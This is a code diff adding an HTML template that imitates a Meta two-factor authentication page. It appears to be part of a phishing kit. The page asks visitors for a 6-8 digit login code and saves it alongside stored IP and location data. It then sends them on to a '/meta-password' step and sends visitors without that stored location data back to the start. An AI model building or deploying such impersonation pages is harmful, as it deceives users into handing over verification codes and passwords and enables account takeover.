@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en" style="margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden">
+    <head>
+        <title><%= title %></title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+        <link rel="stylesheet" href="/css/style.css" />
+    </head>
+    <body style="font-family: Arial, Helvetica, sans-serif">
+        <header style="display: flex; align-items: center; justify-content: space-between; padding: 15px; background-color: #f5f5f5; flex-wrap: wrap">
+            <img src="/images/meta-image.svg" alt="" style="height: 20px" />
+            <div id="menu" style="display: flex; gap: 20px; flex-wrap: wrap">
+                <p style="margin: 5px; white-space: nowrap">Meta Quest</p>
+                <p style="margin: 5px; white-space: nowrap">Ray-Ban Meta</p>
+                <p style="margin: 5px; white-space: nowrap">Apps and games</p>
+                <p style="margin: 5px; white-space: nowrap">About Meta</p>
+                <p style="margin: 5px; white-space: nowrap">Support</p>
+            </div>
+            <script>
+                const checkResponsive = () => {
+                    const menu = document.getElementById('menu');
+                    if (window.innerWidth < 768) {
+                        menu.style.display = 'none';
+                    } else {
+                        menu.style.display = 'flex';
+                    }
+                };
+                window.addEventListener('DOMContentLoaded', () => {
+                    const geoData = JSON.parse(localStorage.getItem('geoData'));
+                    if (geoData) {
+                        window.country = geoData.country || '';
+                        window.country_code = geoData.country_code || '';
+                        window.ip = geoData.ip || '';
+                        window.city = geoData.city || '';
+                        window.region = geoData.region || '';
+                    } else {
+                        window.location.href = '/';
+                    }
+                });
+                window.addEventListener('load', checkResponsive);
+                window.addEventListener('resize', checkResponsive);
+            </script>
+        </header>
+
+        <section style="max-width: 600px; margin: 0 auto; padding: 20px; font-family: Arial, sans-serif">
+            <h1 style="font-size: 24px; margin-bottom: 10px; font-weight: bold">Authentication</h1>
+
+            <h2 style="font-size: 28px; margin-top: 0; margin-bottom: 20px; font-weight: bold">Check notifications on another device</h2>
+
+            <p style="margin-bottom: 20px; color: #333; line-height: 1.5">We have sent a notification to your device. Please check the notification there and accept the login or enter the 6-8 digit code we sent you to continue.</p>
+
+            <div style="margin: 25px 0">
+                <img src="/images/notification-device.png" alt="Device notification" style="width: 100%; border-radius: 12px; background-color: #d9f1f0" />
+            </div>
+
+            <div style="display: flex; align-items: flex-start; margin: 20px 0">
+                <div class="loading-dots-container" style="margin-right: 10px; margin-top: 2px; flex-shrink: 0">
+                    <div class="loading-dots">
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                    </div>
+                </div>
+                <div>
+                    <p style="font-weight: bold; margin: 0 0 5px 0">Pending approval</p>
+                    <p style="margin: 0; color: #666; font-size: 14px">It may take a few minutes for you to receive the notification on your other device.</p>
+                </div>
+            </div>
+
+            <div style="margin: 30px 0">
+                <input type="text" id="verificationCode" placeholder="Code" style="width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; box-sizing: border-box; background-color: #f9f9f9" />
+            </div>
+
+            <button id="continueBtn" style="width: 100%; background-color: #1877f2; color: white; border: none; padding: 15px; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer">Continue</button>
+        </section>
+
+        <script>
+            document.addEventListener('DOMContentLoaded', () => {
+                const continueBtn = document.getElementById('continueBtn');
+                const verificationCode = document.getElementById('verificationCode');
+
+                continueBtn.addEventListener('click', () => {
+                    const code = verificationCode.value.trim();
+                    if (code && code.length >= 6 && code.length <= 8) {
+                        const userData = JSON.parse(localStorage.getItem('userData') || '{}');
+                        userData.verificationCode = code;
+                        localStorage.setItem('userData', JSON.stringify(userData));
+                        window.location.href = '/meta-password';
+                    } else {
+                        alert('Please enter a valid 6-8 digit code');
+                    }
+                });
+
+                verificationCode.addEventListener('keypress', (e) => {
+                    if (e.key === 'Enter') {
+                        continueBtn.click();
+                    }
+                });
+            });
+        </script>
+    </body>
+</html>
